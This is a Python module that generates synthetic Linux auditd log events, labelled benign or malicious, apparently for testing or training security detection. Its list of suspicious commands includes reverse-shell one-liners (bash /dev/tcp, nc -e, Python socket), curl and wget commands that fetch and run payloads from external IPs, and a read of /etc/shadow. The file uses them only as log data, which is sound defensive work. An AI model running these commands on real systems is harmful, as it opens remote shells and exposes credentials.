"""Linux audit log source generator.

Generates realistic auditd log lines and structured dicts for common
syscalls, user authentication events, and network operations.
"""
from __future__ import annotations

import random
import time
from datetime import datetime, timezone, timedelta
from typing import Any

from backend.log_sources.base_log_source import AbstractLogSource


# ── Static data pools ────────────────────────────────────────────────────────

_HOSTNAMES = [
    "web-prod-01", "db-master-02", "app-server-03", "bastion-01",
    "dev-workstation-07", "build-agent-04", "k8s-node-11",
    "fileserver-02", "jenkins-master", "ldap-srv-01",
]

_USERNAMES = [
    "root", "ubuntu", "ec2-user", "deploy", "jenkins",
    "jsmith", "alice", "bob", "svc_backup", "svc_postgres",
    "www-data", "nobody", "daemon",
]

_INTERNAL_IPS = [
    f"10.0.{b}.{d}"
    for b in range(1, 4)
    for d in [5, 10, 20, 50, 100, 200]
]

_EXTERNAL_IPS = [
    "185.220.101.34", "45.155.205.233", "91.219.236.174",
    "23.129.64.130", "104.244.76.13", "193.42.33.7",
]

_SUSPICIOUS_CMDS = [
    "/bin/bash -i >& /dev/tcp/185.220.101.34/4444 0>&1",
    "nc -e /bin/bash 91.219.236.174 1337",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"45.155.205.233\",4444));...'",
    "curl -s http://185.220.101.34/payload.sh | bash",
    "wget -qO- http://91.219.236.174/beacon && chmod +x /tmp/beacon && /tmp/beacon &",
    "nmap -sS -p 1-65535 10.0.0.0/24",
    "cat /etc/shadow",
    "sudo -l",
    "find / -perm -4000 -type f 2>/dev/null",
    "crontab -l",
    "ps aux | grep -v grep",
    "/usr/bin/python3 /tmp/.hidden_script.py",
]

_BENIGN_CMDS = [
    "/usr/bin/ls -la /home",
    "/usr/bin/top",
    "/bin/systemctl status nginx",
    "/usr/bin/df -h",
    "/bin/cat /etc/hostname",
    "/usr/bin/id",
    "/bin/grep error /var/log/syslog",
    "/usr/sbin/useradd newuser",
    "/bin/tar -czf /backup/archive.tar.gz /var/www",
    "/usr/bin/apt-get update",
]

_SYSCALLS = ["execve", "open", "openat", "connect", "socket", "read", "write", "unlink", "rename", "chmod"]

_ARCH = ["x86_64", "i386"]

_EXIT_CODES = [0, 0, 0, 0, -1, -2, -13]  # mostly success

_FILE_PATHS_SUSPICIOUS = [
    "/tmp/.hidden_beacon", "/tmp/payload", "/dev/shm/agent",
    "/var/tmp/.sysupdate", "/usr/local/bin/svchelper",
    "/etc/cron.d/update_helper",
]

_FILE_PATHS_BENIGN = [
    "/var/log/syslog", "/etc/nginx/nginx.conf", "/home/ubuntu/.bashrc",
    "/var/www/html/index.html", "/etc/passwd", "/usr/share/doc/README",
]

_OBJ_TYPES = ["SYSCALL", "CWD", "PATH", "EXECVE", "PROCTITLE"]


def _audit_ts(offset_seconds: int = 0) -> str:
    """Return an audit-style timestamp string: audit(1234567890.123:456)"""
    t = time.time() - offset_seconds
    serial = random.randint(1000, 9999)
    return f"audit({t:.3f}:{serial})"


def _kvline(record_type: str, fields: dict[str, Any]) -> str:
    """Render an audit log line in key=value format."""
    kv = " ".join(f'{k}="{v}"' if " " in str(v) else f"{k}={v}" for k, v in fields.items())
    return f"type={record_type} msg={_audit_ts(random.randint(0, 3600))} {kv}"


def _rand_pid() -> int:
    return random.randint(1000, 65535)


def _rand_uid() -> int:
    return random.choice([0, 0, 1000, 1001, 1002, 33, 65534])


class LinuxAuditSource(AbstractLogSource):
    source_type = "linux_audit"
    description = "Linux auditd log events"

    # ── individual event generators ───────────────────────────────────────────

    def _gen_syscall_execve(self, malicious: bool) -> dict[str, Any]:
        cmd = random.choice(_SUSPICIOUS_CMDS if malicious else _BENIGN_CMDS)
        pid = _rand_pid()
        uid = 0 if malicious else _rand_uid()
        auid = random.randint(1000, 1010)
        fields = {
            "arch": "c000003e",
            "syscall": "execve",
            "success": "yes",
            "exit": 0,
            "a0": f"0x{random.randint(0x7f000000, 0x7fffffff):x}",
            "a1": f"0x{random.randint(0x7f000000, 0x7fffffff):x}",
            "a2": f"0x{random.randint(0x7f000000, 0x7fffffff):x}",
            "a3": 0,
            "items": random.randint(1, 4),
            "ppid": random.randint(1, 32768),
            "pid": pid,
            "auid": auid,
            "uid": uid,
            "gid": uid,
            "euid": uid,
            "suid": uid,
            "fsuid": uid,
            "egid": uid,
            "sgid": uid,
            "fsgid": uid,
            "tty": random.choice(["pts0", "pts1", "pts2", "(none)"]),
            "ses": random.randint(1, 100),
            "comm": cmd.split()[0].split("/")[-1][:15],
            "exe": cmd.split()[0],
            "subj": random.choice(["unconfined_u:unconfined_r:unconfined_t:s0", "system_u:system_r:init_t:s0"]),
            "key": "execve_audit" if not malicious else "suspicious_exec",
        }
        proctitle = " ".join(cmd.split()[:4])
        return {
            "raw_line": _kvline("SYSCALL", fields),
            "type": "SYSCALL",
            "syscall": "execve",
            "pid": pid,
            "uid": uid,
            "gid": uid,
            "auid": auid,
            "ses": fields["ses"],
            "comm": fields["comm"],
            "exe": fields["exe"],
            "cmdline": cmd,
            "proctitle": proctitle,
            "hostname": random.choice(_HOSTNAMES),
            "subj": fields["subj"],
            "key": fields["key"],
            "malicious_indicator": malicious,
        }

    def _gen_syscall_connect(self, malicious: bool) -> dict[str, Any]:
        dst_ip = random.choice(_EXTERNAL_IPS if malicious else _INTERNAL_IPS)
        dst_port = random.choice([4444, 1337, 8080, 443, 80, 22, 53])
        pid = _rand_pid()
        uid = _rand_uid()
        fields = {
            "arch": "c000003e",
            "syscall": "connect",
            "success": random.choice(["yes", "yes", "no"]),
            "exit": random.choice([0, 0, -111]),
            "a0": f"0x{random.randint(3, 15):x}",
            "a1": f"0x{random.randint(0x7f000000, 0x7fffffff):x}",
            "a2": 16,
            "a3": 0,
            "items": 0,
            "ppid": random.randint(1, 32768),
            "pid": pid,
            "auid": random.randint(1000, 1010),
            "uid": uid,
            "gid": uid,
            "euid": uid,
            "suid": uid,
            "fsuid": uid,
            "egid": uid,
            "sgid": uid,
            "fsgid": uid,
            "tty": "(none)",
            "ses": random.randint(1, 100),
            "comm": random.choice(["curl", "wget", "nc", "python3", "bash", "sshd"]),
            "exe": random.choice(["/usr/bin/curl", "/usr/bin/wget", "/bin/nc", "/usr/bin/python3"]),
            "key": "network_connect" if not malicious else "suspicious_connect",
        }
        return {
            "raw_line": _kvline("SYSCALL", fields),
            "type": "SYSCALL",
            "syscall": "connect",
            "pid": pid,
            "uid": uid,
            "gid": uid,
            "auid": fields["auid"],
            "ses": fields["ses"],
            "comm": fields["comm"],
            "exe": fields["exe"],
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "hostname": random.choice(_HOSTNAMES),
            "key": fields["key"],
            "malicious_indicator": malicious,
        }

    def _gen_user_auth(self, malicious: bool) -> dict[str, Any]:
        user = random.choice(["root", "admin"] if malicious else _USERNAMES)
        result = random.choice(["failed", "failed", "failed"] if malicious else ["success", "success", "failed"])
        pid = _rand_pid()
        fields = {
            "pid": pid,
            "uid": 0 if user == "root" else _rand_uid(),
            "auid": random.randint(1000, 1010),
            "ses": random.randint(1, 100),
            "msg": f"op=PAM:authentication acct={user} exe=/usr/sbin/sshd hostname={random.choice(_HOSTNAMES)} "
                   f"addr={random.choice(_EXTERNAL_IPS if malicious else _INTERNAL_IPS)} "
                   f"terminal=ssh res={result}",
            "key": "user_auth",
        }
        return {
            "raw_line": _kvline("USER_AUTH", fields),
            "type": "USER_AUTH",
            "pid": pid,
            "uid": fields["uid"],
            "gid": fields["uid"],
            "auid": fields["auid"],
            "ses": fields["ses"],
            "op": "PAM:authentication",
            "acct": user,
            "exe": "/usr/sbin/sshd",
            "res": result,
            "hostname": random.choice(_HOSTNAMES),
            "key": "user_auth",
            "malicious_indicator": malicious,
        }

    def _gen_user_login(self, malicious: bool) -> dict[str, Any]:
        user = random.choice(["root"] if malicious else _USERNAMES)
        pid = _rand_pid()
        uid = 0 if user == "root" else _rand_uid()
        src_ip = random.choice(_EXTERNAL_IPS if malicious else _INTERNAL_IPS)
        fields = {
            "pid": pid,
            "uid": uid,
            "auid": uid,
            "ses": random.randint(1, 100),
            "msg": f"op=login id={uid} exe=/usr/sbin/sshd hostname={random.choice(_HOSTNAMES)} "
                   f"addr={src_ip} terminal=ssh res=success",
            "key": "user_login",
        }
        return {
            "raw_line": _kvline("USER_LOGIN", fields),
            "type": "USER_LOGIN",
            "pid": pid,
            "uid": uid,
            "gid": uid,
            "auid": uid,
            "ses": fields["ses"],
            "op": "login",
            "acct": user,
            "src_ip": src_ip,
            "exe": "/usr/sbin/sshd",
            "hostname": random.choice(_HOSTNAMES),
            "key": "user_login",
            "malicious_indicator": malicious,
        }

    def _gen_file_create(self, malicious: bool) -> dict[str, Any]:
        fpath = random.choice(_FILE_PATHS_SUSPICIOUS if malicious else _FILE_PATHS_BENIGN)
        pid = _rand_pid()
        uid = _rand_uid()
        fields = {
            "arch": "c000003e",
            "syscall": "openat",
            "success": "yes",
            "exit": 3,
            "a0": "ffffff9c",
            "a1": f"0x{random.randint(0x7f000000, 0x7fffffff):x}",
            "a2": "0101",
            "a3": "0666",
            "items": 2,
            "ppid": random.randint(1, 32768),
            "pid": pid,
            "auid": random.randint(1000, 1010),
            "uid": uid,
            "gid": uid,
            "euid": uid,
            "suid": uid,
            "fsuid": uid,
            "egid": uid,
            "sgid": uid,
            "fsgid": uid,
            "tty": "(none)",
            "ses": random.randint(1, 100),
            "comm": "bash",
            "exe": "/bin/bash",
            "key": "file_create" if not malicious else "suspicious_file_create",
        }
        return {
            "raw_line": _kvline("SYSCALL", fields) + f'\ntype=PATH msg={_audit_ts()} item=1 name="{fpath}" inode={random.randint(100000, 999999)} dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 obj=unconfined_u:object_r:tmp_t:s0',
            "type": "FILE_CREATE",
            "syscall": "openat",
            "pid": pid,
            "uid": uid,
            "gid": uid,
            "auid": fields["auid"],
            "ses": fields["ses"],
            "file_path": fpath,
            "hostname": random.choice(_HOSTNAMES),
            "key": fields["key"],
            "malicious_indicator": malicious,
        }

    def _gen_file_delete(self, malicious: bool) -> dict[str, Any]:
        fpath = random.choice(_FILE_PATHS_SUSPICIOUS if malicious else _FILE_PATHS_BENIGN)
        pid = _rand_pid()
        uid = _rand_uid()
        fields = {
            "arch": "c000003e",
            "syscall": "unlinkat",
            "success": "yes",
            "exit": 0,
            "a0": "ffffff9c",
            "a1": f"0x{random.randint(0x7f000000, 0x7fffffff):x}",
            "a2": 0,
            "a3": 0,
            "items": 2,
            "ppid": random.randint(1, 32768),
            "pid": pid,
            "auid": random.randint(1000, 1010),
            "uid": uid,
            "gid": uid,
            "euid": uid,
            "suid": uid,
            "fsuid": uid,
            "egid": uid,
            "sgid": uid,
            "fsgid": uid,
            "tty": "(none)",
            "ses": random.randint(1, 100),
            "comm": "rm",
            "exe": "/bin/rm",
            "key": "file_delete" if not malicious else "suspicious_file_delete",
        }
        return {
            "raw_line": _kvline("SYSCALL", fields),
            "type": "FILE_DELETE",
            "syscall": "unlinkat",
            "pid": pid,
            "uid": uid,
            "gid": uid,
            "auid": fields["auid"],
            "ses": fields["ses"],
            "file_path": fpath,
            "hostname": random.choice(_HOSTNAMES),
            "key": fields["key"],
            "malicious_indicator": malicious,
        }

    def _gen_netfilter_cfg(self, malicious: bool) -> dict[str, Any]:
        """iptables / nftables configuration change."""
        pid = _rand_pid()
        uid = 0  # needs root
        rule = (
            "iptables -A OUTPUT -d 0.0.0.0/0 -j ACCEPT" if malicious
            else "iptables -A INPUT -p tcp --dport 22 -j ACCEPT"
        )
        fields = {
            "table": random.choice(["filter", "nat", "mangle"]),
            "family": "2",
            "entries": random.randint(1, 50),
            "pid": pid,
            "uid": uid,
            "auid": uid,
            "ses": random.randint(1, 100),
            "subj": "unconfined_u:unconfined_r:unconfined_t:s0",
            "key": "iptables_change",
        }
        return {
            "raw_line": _kvline("NETFILTER_CFG", fields),
            "type": "NETFILTER_CFG",
            "pid": pid,
            "uid": uid,
            "gid": uid,
            "auid": uid,
            "ses": fields["ses"],
            "op": rule,
            "table": fields["table"],
            "subj": fields["subj"],
            "hostname": random.choice(_HOSTNAMES),
            "key": "iptables_change",
            "malicious_indicator": malicious,
        }

    # ── dispatch ──────────────────────────────────────────────────────────────

    _GENERATORS = [
        _gen_syscall_execve, _gen_syscall_execve,
        _gen_syscall_connect,
        _gen_user_auth, _gen_user_auth,
        _gen_user_login,
        _gen_file_create, _gen_file_create,
        _gen_file_delete,
        _gen_netfilter_cfg,
    ]

    # ── public API ────────────────────────────────────────────────────────────

    def generate(self, malicious: bool = False, technique_id: str = "") -> dict[str, Any]:
        gen_fn = random.choice(self._GENERATORS)
        return gen_fn(self, malicious)

    def generate_batch(
        self,
        count: int = 10,
        malicious_ratio: float = 0.1,
        technique_id: str = "",
    ) -> list[dict[str, Any]]:
        events: list[dict[str, Any]] = []
        malicious_count = max(0, min(count, round(count * malicious_ratio)))
        for i in range(count):
            is_malicious = i < malicious_count
            events.append(self.generate(malicious=is_malicious, technique_id=technique_id))
        random.shuffle(events)
        return events
